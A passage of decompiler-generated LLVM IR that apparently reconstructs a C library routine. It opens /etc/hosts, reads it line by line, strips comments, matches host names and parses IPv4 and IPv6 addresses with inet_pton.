  %v1_1a794 = add i32 %v0_1a794, 36
  store i32 %v1_1a794, i32* @r6, align 4
  %v1_1a798 = add i32 %v0_1a794, 48
  store i32 %v1_1a798, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_1a790, 80
  br i1 %tmp84, label %dec_label_pc_1a9fc, label %dec_label_pc_1a7a0

dec_label_pc_1a7a0:                               ; preds = %bb74
  %v0_1a7a0 = call i32 @__open_etc_hosts()
  store i32 %v0_1a7a0, i32* %r0.global-to-local, align 4
  %v2_1a7a4 = icmp eq i32 %v0_1a7a0, 0
  br i1 %v2_1a7a4, label %dec_label_pc_1a7c0, label %.thread

.thread:                                          ; preds = %dec_label_pc_1a7a0
  %v1_1a7ac = load i32, i32* @fp, align 4
  store i32 %v1_1a7ac, i32* @r7, align 4
  %v1_1a7b0 = load i32, i32* @r5, align 4
  store i32 %v1_1a7b0, i32* @fp, align 4
  %v1_1a7b4 = load i32, i32* @r6, align 4
  %v1_1a7b8 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1a874

dec_label_pc_1a7c0:                               ; preds = %dec_label_pc_1a7a0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_1a7c8 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_1a7c8, align 4
  %v0_1a7cc = call i32 @__errno_location()
  store i32 %v0_1a7cc, i32* %r0.global-to-local, align 4
  %v1_1a7d0 = inttoptr i32 %v0_1a7cc to i32*
  %v2_1a7d0 = load i32, i32* %v1_1a7d0, align 4
  store i32 %v2_1a7d0, i32* @sl, align 4
  br label %dec_label_pc_1aa00

dec_label_pc_1a7d8:                               ; preds = %dec_label_pc_1a988
  %v0_1a7d8 = load i32, i32* @r4, align 4
  %v1_1a7d8 = add i32 %v0_1a7d8, 4
  %v2_1a7d8 = inttoptr i32 %v1_1a7d8 to i32*
  %v3_1a7d8 = load i32, i32* %v2_1a7d8, align 4
  %v1_1a7dc = load i32, i32* @sb, align 4
  %v2_1a7dc = inttoptr i32 %v1_1a7dc to i32*
  store i32 %v3_1a7d8, i32* %v2_1a7dc, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1a7f0 = load i32, i32* @r4, align 4
  %v1_1a7f0 = add i32 %v0_1a7f0, 8
  store i32 %v1_1a7f0, i32* %r1.global-to-local, align 4
  %v1_1a7f4 = load i32, i32* @sb, align 4
  %v2_1a7f4 = add i32 %v1_1a7f4, 8
  %v3_1a7f4 = inttoptr i32 %v2_1a7f4 to i32*
  store i32 2, i32* %v3_1a7f4, align 4
  %v0_1a7f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1a7f8, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1a800 = load i32, i32* @sb, align 4
  %v1_1a800 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a800 = inttoptr i32 %v1_1a800 to i32*
  store i32 %v0_1a800, i32* %v2_1a800, align 4
  %v0_1a804 = load i32, i32* @r7, align 4
  %v1_1a804 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a804 = inttoptr i32 %v1_1a804 to i32*
  store i32 %v0_1a804, i32* %v2_1a804, align 4
  %v0_1a808 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a808 = load i32, i32* @sb, align 4
  %v2_1a808 = add i32 %v1_1a808, 12
  %v3_1a808 = inttoptr i32 %v2_1a808 to i32*
  store i32 %v0_1a808, i32* %v3_1a808, align 4
  %v0_1a80c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a80c = load i32, i32* @sb, align 4
  %v2_1a80c = add i32 %v1_1a80c, 16
  %v3_1a80c = inttoptr i32 %v2_1a80c to i32*
  store i32 %v0_1a80c, i32* %v3_1a80c, align 4
  %v0_1a810 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a810 = load i32, i32* @sb, align 4
  %v2_1a810 = add i32 %v1_1a810, 4
  %v3_1a810 = inttoptr i32 %v2_1a810 to i32*
  store i32 %v0_1a810, i32* %v3_1a810, align 4
  %v0_1a814 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a814 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a814 = add i32 %v1_1a814, 4
  %v3_1a814 = inttoptr i32 %v2_1a814 to i32*
  store i32 %v0_1a814, i32* %v3_1a814, align 4
  br label %dec_label_pc_1a9e4

dec_label_pc_1a81c:                               ; preds = %dec_label_pc_1a9b0
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_1a820 = load i32, i32* @r4, align 4
  %v1_1a820 = add i32 %v0_1a820, 4
  %v2_1a820 = inttoptr i32 %v1_1a820 to i32*
  %v3_1a820 = load i32, i32* %v2_1a820, align 4
  store i32 %v3_1a820, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_1a828 = load i32, i32* @sb, align 4
  %v2_1a828 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_1a828, i32* %v2_1a828, align 4
  store i32 %v0_1a880, i32* %ip.global-to-local, align 4
  %v0_1a830 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a830 = load i32, i32* @sb, align 4
  %v2_1a830 = inttoptr i32 %v1_1a830 to i32*
  store i32 %v0_1a830, i32* %v2_1a830, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a83c = load i32, i32* %ip.global-to-local, align 4
  %v1_1a83c = load i32, i32* %r0.global-to-local, align 4
  %v2_1a83c = inttoptr i32 %v1_1a83c to i32*
  store i32 %v0_1a83c, i32* %v2_1a83c, align 4
  %v0_1a840 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a840 = load i32, i32* @sb, align 4
  %v2_1a840 = add i32 %v1_1a840, 12
  %v3_1a840 = inttoptr i32 %v2_1a840 to i32*
  store i32 %v0_1a840, i32* %v3_1a840, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1a84c = load i32, i32* @r4, align 4
  %v1_1a84c = add i32 %v0_1a84c, 8
  store i32 %v1_1a84c, i32* %r1.global-to-local, align 4
  %v0_1a850 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1a850, i32* @sl, align 4
  %v1_1a854 = load i32, i32* @sb, align 4
  %v2_1a854 = add i32 %v1_1a854, 8
  %v3_1a854 = inttoptr i32 %v2_1a854 to i32*
  store i32 10, i32* %v3_1a854, align 4
  %v0_1a858 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a858 = load i32, i32* @sb, align 4
  %v2_1a858 = add i32 %v1_1a858, 16
  %v3_1a858 = inttoptr i32 %v2_1a858 to i32*
  store i32 %v0_1a858, i32* %v3_1a858, align 4
  %v0_1a85c = load i32, i32* %r1.global-to-local, align 4
  %v1_1a85c = load i32, i32* @sb, align 4
  %v2_1a85c = add i32 %v1_1a85c, 4
  %v3_1a85c = inttoptr i32 %v2_1a85c to i32*
  store i32 %v0_1a85c, i32* %v3_1a85c, align 4
  %v0_1a860 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a860 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a860 = add i32 %v1_1a860, 4
  %v3_1a860 = inttoptr i32 %v2_1a860 to i32*
  store i32 %v0_1a860, i32* %v3_1a860, align 4
  br label %dec_label_pc_1a9e4

dec_label_pc_1a868:                               ; preds = %dec_label_pc_1a730
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_1a874

dec_label_pc_1a874:                               ; preds = %.thread, %dec_label_pc_1a868
  %v2_1a884.pre-phi = phi i32* [ %v2_1a750, %.thread ], [ %.pre, %dec_label_pc_1a868 ]
  %v0_1a880 = phi i32 [ %v1_1a7ac, %.thread ], [ 0, %dec_label_pc_1a868 ]
  %stack_var_-40.1 = phi i32 [ %v1_1a7b8, %.thread ], [ 0, %dec_label_pc_1a868 ]
  %stack_var_-48.1 = phi i32 [ %v1_1a7b4, %.thread ], [ 0, %dec_label_pc_1a868 ]
  %stack_var_-52.0 = phi i32 [ %v0_1a7a0, %.thread ], [ %v0_1a700, %dec_label_pc_1a868 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_1a884.pre-phi, align 4
  %v2_1a948 = inttoptr i32 %v0_1a704 to i8*
  %v7_1a980 = icmp eq i32 %v0_1a6fc, 2
  %v7_1a9a8 = icmp eq i32 %v0_1a6fc, 10
  br label %dec_label_pc_1a9cc

dec_label_pc_1a88c:                               ; preds = %dec_label_pc_1a9cc
  %v0_1a88c = load i32, i32* @fp, align 4
  store i32 %v0_1a88c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_1a894 = call i32 @__GI_strchr(i32 %v0_1a88c, i32 35)
  store i32 %v2_1a894, i32* %r0.global-to-local, align 4
  %v3_1a898 = icmp eq i32 %v2_1a894, 0
  br i1 %v3_1a898, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1a88c
  %v0_1a8a011 = load i32, i32* @fp, align 4
  store i32 %v0_1a8a011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1a90c.preheader

bb75:                                             ; preds = %dec_label_pc_1a88c
  %v3_1a894 = inttoptr i32 %v2_1a894 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a8a0 = load i32, i32* @fp, align 4
  store i32 %v0_1a8a0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_1a894, align 1
  %v0_1a90c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a90c.preheader

dec_label_pc_1a90c.preheader:                     ; preds = %bb75, %.thread10
  %v0_1a90c30 = phi i32 [ %v0_1a90c30.pre, %bb75 ], [ %v0_1a8a011, %.thread10 ]
  %v1_1a90c31 = inttoptr i32 %v0_1a90c30 to i8*
  %v2_1a90c32 = load i8, i8* %v1_1a90c31, align 1
  %v3_1a90c33 = zext i8 %v2_1a90c32 to i32
  store i32 %v3_1a90c33, i32* %r3.global-to-local, align 4
  %v2_1a91034 = icmp eq i8 %v2_1a90c32, 0
  br i1 %v2_1a91034, label %dec_label_pc_1a918, label %dec_label_pc_1a8b8.preheader

dec_label_pc_1a8b0:                               ; preds = %dec_label_pc_1a8c4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1a8b4 = inttoptr i32 %v8_1a8dc to i8*
  store i8 0, i8* %v3_1a8b4, align 1
  %v4_1a8b4 = load i32, i32* %r2.global-to-local, align 4
  %v5_1a8b4 = add i32 %v4_1a8b4, 1
  store i32 %v5_1a8b4, i32* %r2.global-to-local, align 4
  %v1_1a8b8 = inttoptr i32 %v5_1a8b4 to i8*
  %v2_1a8b8 = load i8, i8* %v1_1a8b8, align 1
  %v3_1a8b8 = zext i8 %v2_1a8b8 to i32
  store i32 %v3_1a8b8, i32* %r1.global-to-local, align 4
  %v2_1a8bc = icmp eq i8 %v2_1a8b8, 0
  br i1 %v2_1a8bc, label %dec_label_pc_1a918, label %dec_label_pc_1a8c4

dec_label_pc_1a8c4:                               ; preds = %dec_label_pc_1a8b8.preheader, %dec_label_pc_1a8b0
  %v8_1a8dc = phi i32 [ %v5_1a8b4, %dec_label_pc_1a8b0 ], [ %v0_1a8b820, %dec_label_pc_1a8b8.preheader ]
  %v1_1a8cc = phi i32 [ %v3_1a8b8, %dec_label_pc_1a8b0 ], [ %v3_1a8b823, %dec_label_pc_1a8b8.preheader ]
  %v2_1a8c8 = load i32, i32* @global_var_264e8, align 4
  store i32 %v2_1a8c8, i32* %r3.global-to-local, align 4
  %v3_1a8cc = mul nuw nsw i32 %v1_1a8cc, 2
  %v4_1a8cc = add i32 %v3_1a8cc, %v2_1a8c8
  %v5_1a8cc = inttoptr i32 %v4_1a8cc to i8*
  %v6_1a8cc = load i8, i8* %v5_1a8cc, align 1
  %v8_1a8cc = zext i8 %v6_1a8cc to i32
  store i32 %v8_1a8cc, i32* %r3.global-to-local, align 4
  %v1_1a8d0 = and i32 %v8_1a8cc, 32
  %v2_1a8d0 = icmp eq i32 %v1_1a8d0, 0
  br i1 %v2_1a8d0, label %dec_label_pc_1a8d8, label %dec_label_pc_1a8b0

dec_label_pc_1a8d8:                               ; preds = %dec_label_pc_1a8c4
  %v0_1a8d8 = load i32, i32* @r6, align 4
  %v7_1a8dc = icmp slt i32 %v0_1a8d8, 7
  br i1 %v7_1a8dc, label %bb76, label %dec_label_pc_1a8ec.preheader

bb76:                                             ; preds = %dec_label_pc_1a8d8
  %v9_1a8dc = load i32, i32* @r4, align 4
  %v13_1a8dc = mul i32 %v0_1a8d8, 4
  %v14_1a8dc = add i32 %v9_1a8dc, %v13_1a8dc
  %v15_1a8dc = inttoptr i32 %v14_1a8dc to i32*
  store i32 %v8_1a8dc, i32* %v15_1a8dc, align 4
  %v8_1a8e0 = load i32, i32* @r6, align 4
  %v9_1a8e0 = add i32 %v8_1a8e0, 1
  store i32 %v9_1a8e0, i32* @r6, align 4
  %v0_1a8ec25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a8ec.preheader

dec_label_pc_1a8ec.preheader:                     ; preds = %bb76, %dec_label_pc_1a8d8
  %v0_1a8ec25 = phi i32 [ %v0_1a8ec25.pre, %bb76 ], [ %v8_1a8dc, %dec_label_pc_1a8d8 ]
  %v1_1a8ec26 = inttoptr i32 %v0_1a8ec25 to i8*
  %v2_1a8ec27 = load i8, i8* %v1_1a8ec26, align 1
  %v3_1a8ec28 = zext i8 %v2_1a8ec27 to i32
  store i32 %v3_1a8ec28, i32* %r1.global-to-local, align 4
  %v2_1a8f029 = icmp eq i8 %v2_1a8ec27, 0
  br i1 %v2_1a8f029, label %dec_label_pc_1a90c.loopexit, label %dec_label_pc_1a8f8.lr.ph

dec_label_pc_1a8f8.lr.ph:                         ; preds = %dec_label_pc_1a8ec.preheader
  %v2_1a8fc.pre = load i32, i32* @global_var_264e8, align 4
  br label %dec_label_pc_1a8f8

dec_label_pc_1a8e8:                               ; preds = %dec_label_pc_1a8f8
  %v1_1a8e8 = add i32 %v0_1a8e8, 1
  store i32 %v1_1a8e8, i32* %r2.global-to-local, align 4
  %v1_1a8ec = inttoptr i32 %v1_1a8e8 to i8*
  %v2_1a8ec = load i8, i8* %v1_1a8ec, align 1
  %v3_1a8ec = zext i8 %v2_1a8ec to i32
  store i32 %v3_1a8ec, i32* %r1.global-to-local, align 4
  %v2_1a8f0 = icmp eq i8 %v2_1a8ec, 0
  br i1 %v2_1a8f0, label %dec_label_pc_1a90c.loopexit, label %dec_label_pc_1a8f8

dec_label_pc_1a8f8:                               ; preds = %dec_label_pc_1a8f8.lr.ph, %dec_label_pc_1a8e8
  %v0_1a8e8 = phi i32 [ %v0_1a8ec25, %dec_label_pc_1a8f8.lr.ph ], [ %v1_1a8e8, %dec_label_pc_1a8e8 ]
  %v1_1a900 = phi i32 [ %v3_1a8ec28, %dec_label_pc_1a8f8.lr.ph ], [ %v3_1a8ec, %dec_label_pc_1a8e8 ]
  store i32 %v2_1a8fc.pre, i32* %r3.global-to-local, align 4
  %v3_1a900 = mul nuw nsw i32 %v1_1a900, 2
  %v4_1a900 = add i32 %v3_1a900, %v2_1a8fc.pre
  %v5_1a900 = inttoptr i32 %v4_1a900 to i8*
  %v6_1a900 = load i8, i8* %v5_1a900, align 1
  %v8_1a900 = zext i8 %v6_1a900 to i32
  store i32 %v8_1a900, i32* %r3.global-to-local, align 4
  %v1_1a904 = and i32 %v8_1a900, 32
  %v2_1a904 = icmp eq i32 %v1_1a904, 0
  br i1 %v2_1a904, label %dec_label_pc_1a8e8, label %dec_label_pc_1a90c.loopexit

dec_label_pc_1a90c.loopexit:                      ; preds = %dec_label_pc_1a8f8, %dec_label_pc_1a8e8, %dec_label_pc_1a8ec.preheader
  %v0_1a90c = phi i32 [ %v0_1a8ec25, %dec_label_pc_1a8ec.preheader ], [ %v0_1a8e8, %dec_label_pc_1a8f8 ], [ %v1_1a8e8, %dec_label_pc_1a8e8 ]
  %v1_1a90c = inttoptr i32 %v0_1a90c to i8*
  %v2_1a90c = load i8, i8* %v1_1a90c, align 1
  %v3_1a90c = zext i8 %v2_1a90c to i32
  store i32 %v3_1a90c, i32* %r3.global-to-local, align 4
  %v2_1a910 = icmp eq i8 %v2_1a90c, 0
  br i1 %v2_1a910, label %dec_label_pc_1a918, label %dec_label_pc_1a8b8.preheader

dec_label_pc_1a8b8.preheader:                     ; preds = %dec_label_pc_1a90c.preheader, %dec_label_pc_1a90c.loopexit
  %v0_1a8b820 = phi i32 [ %v0_1a90c, %dec_label_pc_1a90c.loopexit ], [ %v0_1a90c30, %dec_label_pc_1a90c.preheader ]
  %v1_1a8b821 = inttoptr i32 %v0_1a8b820 to i8*
  %v2_1a8b822 = load i8, i8* %v1_1a8b821, align 1
  %v3_1a8b823 = zext i8 %v2_1a8b822 to i32
  store i32 %v3_1a8b823, i32* %r1.global-to-local, align 4
  %v2_1a8bc24 = icmp eq i8 %v2_1a8b822, 0
  br i1 %v2_1a8bc24, label %dec_label_pc_1a918, label %dec_label_pc_1a8c4

dec_label_pc_1a918:                               ; preds = %dec_label_pc_1a90c.loopexit, %dec_label_pc_1a8b8.preheader, %dec_label_pc_1a8b0, %dec_label_pc_1a90c.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a91c = load i32, i32* @r6, align 4
  %v1_1a920 = load i32, i32* @r4, align 4
  %v5_1a920 = mul i32 %v0_1a91c, 4
  %v6_1a920 = add i32 %v1_1a920, %v5_1a920
  %v7_1a920 = inttoptr i32 %v6_1a920 to i32*
  store i32 0, i32* %v7_1a920, align 4
  %v7_1a924 = icmp sgt i32 %v0_1a91c, 1
  br i1 %v7_1a924, label %dec_label_pc_1a928, label %dec_label_pc_1a9cc

dec_label_pc_1a928:                               ; preds = %dec_label_pc_1a918
  %v2_1a928 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1a928, i32* %r0.global-to-local, align 4
  %v7_1a92c = icmp eq i32 %v2_1a928, 1
  br i1 %v7_1a92c, label %dec_label_pc_1aa00, label %dec_label_pc_1a934

dec_label_pc_1a934:                               ; preds = %dec_label_pc_1a928
  %v7_1a934 = icmp eq i32 %v2_1a928, 2
  br i1 %v7_1a934, label %dec_label_pc_1a940, label %dec_label_pc_1a96c.preheader

dec_label_pc_1a96c.preheader:                     ; preds = %dec_label_pc_1a934
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1a96c

dec_label_pc_1a940:                               ; preds = %dec_label_pc_1a934
  store i32 %v0_1a704, i32* %r0.global-to-local, align 4
  %v0_1a944 = load i32, i32* @r4, align 4
  %v1_1a944 = inttoptr i32 %v0_1a944 to i32*
  %v2_1a944 = load i32, i32* %v1_1a944, align 4
  store i32 %v2_1a944, i32* @r1, align 4
  %v3_1a948 = call i32 @__GI_strcoll(i8* %v2_1a948, i32 %v2_1a944)
  store i32 %v3_1a948, i32* %r0.global-to-local, align 4
  %v2_1a94c = icmp eq i32 %v3_1a948, 0
  br i1 %v2_1a94c, label %dec_label_pc_1a97c, label %dec_label_pc_1a9cc

dec_label_pc_1a958:                               ; preds = %dec_label_pc_1a96c
  %v0_1a958 = load i32, i32* @r4, align 4
  %v4_1a958 = mul i32 %v1_1a958, 4
  %v5_1a958 = add i32 %v0_1a958, %v4_1a958
  %v6_1a958 = inttoptr i32 %v5_1a958 to i32*
  %v7_1a958 = load i32, i32* %v6_1a958, align 4
  store i32 %v7_1a958, i32* %r1.global-to-local, align 4
  %v3_1a95c = call i32 @__GI_strcasecmp(i8* %v2_1a948, i32 %v7_1a958)
  store i32 %v3_1a95c, i32* %r0.global-to-local, align 4
  %v2_1a960 = icmp eq i32 %v3_1a95c, 0
  %v0_1a964 = load i32, i32* @r5, align 4
  %v1_1a964 = add i32 %v0_1a964, 1
  store i32 %v1_1a964, i32* @r5, align 4
  br i1 %v2_1a960, label %dec_label_pc_1a97c, label %dec_label_pc_1a96c

dec_label_pc_1a96c:                               ; preds = %dec_label_pc_1a96c.preheader, %dec_label_pc_1a958
  %v1_1a958 = phi i32 [ 1, %dec_label_pc_1a96c.preheader ], [ %v1_1a964, %dec_label_pc_1a958 ]
  %v1_1a96c = load i32, i32* @r6, align 4
  store i32 %v0_1a704, i32* %r0.global-to-local, align 4
  %v5_1a974 = icmp slt i32 %v1_1a958, %v1_1a96c
  br i1 %v5_1a974, label %dec_label_pc_1a958, label %dec_label_pc_1a9cc

dec_label_pc_1a97c:                               ; preds = %dec_label_pc_1a958, %dec_label_pc_1a940
  store i32 %v0_1a6fc, i32* %r1.global-to-local, align 4
  br i1 %v7_1a980, label %dec_label_pc_1a988, label %dec_label_pc_1a9a4

dec_label_pc_1a988:                               ; preds = %dec_label_pc_1a97c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1a98c = load i32, i32* @r7, align 4
  store i32 %v0_1a98c, i32* %r2.global-to-local, align 4
  %v0_1a990 = load i32, i32* @r4, align 4
  %v1_1a990 = inttoptr i32 %v0_1a990 to i32*
  %v2_1a990 = load i32, i32* %v1_1a990, align 4
  store i32 %v2_1a990, i32* %r1.global-to-local, align 4
  %v3_1a994 = inttoptr i32 %v2_1a990 to i8*
  %v4_1a994 = call i32 @inet_pton(i32 2, i8* %v3_1a994, i32 %v0_1a98c)
  store i32 %v4_1a994, i32* %r0.global-to-local, align 4
  %v5_1a99c = icmp sgt i32 %v4_1a994, 0
  br i1 %v5_1a99c, label %dec_label_pc_1a7d8, label %dec_label_pc_1a9c8

dec_label_pc_1a9a4:                               ; preds = %dec_label_pc_1a97c
  store i32 %v0_1a6fc, i32* %r2.global-to-local, align 4
  br i1 %v7_1a9a8, label %dec_label_pc_1a9b0, label %dec_label_pc_1a9c8

dec_label_pc_1a9b0:                               ; preds = %dec_label_pc_1a9a4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1a9b4 = load i32, i32* @r4, align 4
  %v1_1a9b4 = inttoptr i32 %v0_1a9b4 to i32*
  %v2_1a9b4 = load i32, i32* %v1_1a9b4, align 4
  store i32 %v2_1a9b4, i32* %r1.global-to-local, align 4
  store i32 %v0_1a880, i32* %r2.global-to-local, align 4
  %v3_1a9bc = inttoptr i32 %v2_1a9b4 to i8*
  %v4_1a9bc = call i32 @inet_pton(i32 10, i8* %v3_1a9bc, i32 %v0_1a880)
  store i32 %v4_1a9bc, i32* %r0.global-to-local, align 4
  %v5_1a9c4 = icmp sgt i32 %v4_1a9bc, 0
  br i1 %v5_1a9c4, label %dec_label_pc_1a81c, label %dec_label_pc_1a9c8

dec_label_pc_1a9c8:                               ; preds = %dec_label_pc_1a988, %dec_label_pc_1a9a4, %dec_label_pc_1a9b0
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1a9cc

dec_label_pc_1a9cc:                               ; preds = %dec_label_pc_1a96c, %dec_label_pc_1a940, %dec_label_pc_1a918, %dec_label_pc_1a9c8, %dec_label_pc_1a874
  %v0_1a9cc = load i32, i32* @fp, align 4
  store i32 %v0_1a9cc, i32* %r0.global-to-local, align 4
  %v0_1a9d0 = load i32, i32* @r8, align 4
  store i32 %v0_1a9d0, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_1a9d8 = call i32 @fgets(i32 %v0_1a9cc, i32 %v0_1a9d0, i32 %stack_var_-52.0)
  store i32 %v3_1a9d8, i32* %r0.global-to-local, align 4
  %v2_1a9dc = icmp eq i32 %v3_1a9d8, 0
  br i1 %v2_1a9dc, label %dec_label_pc_1a9e4, label %dec_label_pc_1a88c

dec_label_pc_1a9e4:                               ; preds = %dec_label_pc_1a9cc, %dec_label_pc_1a81c, %dec_label_pc_1a7d8
  %v2_1a9e4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1a9e4, i32* %r3.global-to-local, align 4
  %v7_1a9e8 = icmp eq i32 %v2_1a9e4, 1
  br i1 %v7_1a9e8, label %dec_label_pc_1aa00, label %dec_label_pc_1a9f0

dec_label_pc_1a9f0:                               ; preds = %dec_label_pc_1a9e4
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_1a9f4 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_1a9f4 = call i32 @__GI_fclose(i8* %v1_1a9f4)
  store i32 %v2_1a9f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1aa00

dec_label_pc_1a9fc:                               ; preds = %dec_label_pc_1a718, %bb74, %dec_label_pc_1a76c, %dec_label_pc_1a764, %dec_label_pc_1a758, %dec_label_pc_1a744, %dec_label_pc_1a728
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_1aa00

dec_label_pc_1aa00:                               ; preds = %dec_label_pc_1a928, %dec_label_pc_1a9e4, %dec_label_pc_1a9f0, %dec_label_pc_1a7c0, %dec_label_pc_1a9fc
  %v0_1aa00 = load i32, i32* @sl, align 4
  store i32 %v0_1aa00, i32* %r0.global-to-local, align 4
  store i32 %v3_1a6e8, i32* @r4, align 4
  store i32 %v6_1a6e8, i32* @r5, align 4
  store i32 %v12_1a6e8, i32* @r7, align 4
  store i32 %v15_1a6e8, i32* @r8, align 4
  store i32 %v21_1a6e8, i32* @sl, align 4
  store i32 %v24_1a6e8, i32* @fp, align 4
  ret i32 %v0_1aa00

; uselistorder directives
  uselistorder i32 %v1_1a958, { 1, 0 }
  uselistorder i32 %v0_1a91c, { 1, 0 }
  uselistorder i32 %v3_1a8b823, { 1, 0 }
  uselistorder i32 %v0_1a8b820, { 1, 0 }
  uselistorder i32 %v2_1a894, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_1a794, { 1, 0 }
  uselistorder i32 %v0_1a758, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1a73c, { 1, 0 }
  uselistorder i32 %v0_1a708, { 1, 0, 2 }
  uselistorder i32 %v0_1a6fc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1a6f8, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 11, 17, 12, 13, 14, 15, 16, 0, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 18, 10, 19, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 13, 4, 7, 8, 9, 0, 10, 1, 11, 12, 2, 3, 5, 6, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 7, 2, 3, 0, 8, 9, 6, 1, 4, 10, 5 }
  uselistorder i32 (i8*)* @__GI_fclose, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0, 3 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 23, 24, 25, 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 7, { 2, 22, 23, 12, 13, 14, 0, 18, 26, 20, 1, 3, 4, 5, 19, 6, 21, 9, 15, 16, 7, 8, 17, 11, 10, 24, 25 }
  uselistorder i32* @global_var_264e8, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 2, 3, 4, 1 }
  uselistorder i32 10, { 3, 4, 38, 5, 6, 39, 40, 41, 42, 43, 30, 14, 29, 7, 44, 1, 45, 46, 47, 48, 12, 15, 33, 16, 34, 17, 18, 19, 0, 31, 32, 20, 27, 28, 35, 9, 21, 13, 36, 37, 11, 10, 2, 49, 50, 22, 8, 24, 25, 23, 26, 51 }
  uselistorder i32 12, { 50, 51, 52, 0, 53, 7, 54, 19, 12, 13, 3, 57, 14, 10, 74, 75, 76, 77, 78, 79, 11, 80, 81, 82, 83, 84, 85, 15, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 5, 4, 42, 43, 44, 16, 20, 49, 66, 21, 22, 68, 69, 70, 1, 23, 71, 8, 72, 9, 24, 2, 73, 17, 58, 59, 60, 61, 86, 6, 45, 55, 56, 25, 26, 27, 28, 29, 30, 31, 46, 47, 48, 62, 63, 64, 18, 65, 67 }
  uselistorder i32* @sb, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 1, 2, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 4, 33, 34, 35, 36, 37, 38, 5, 6, 7, 8, 9, 10, 0, 11 }
  uselistorder i32 80, { 0, 2, 3, 4, 1, 5, 6 }
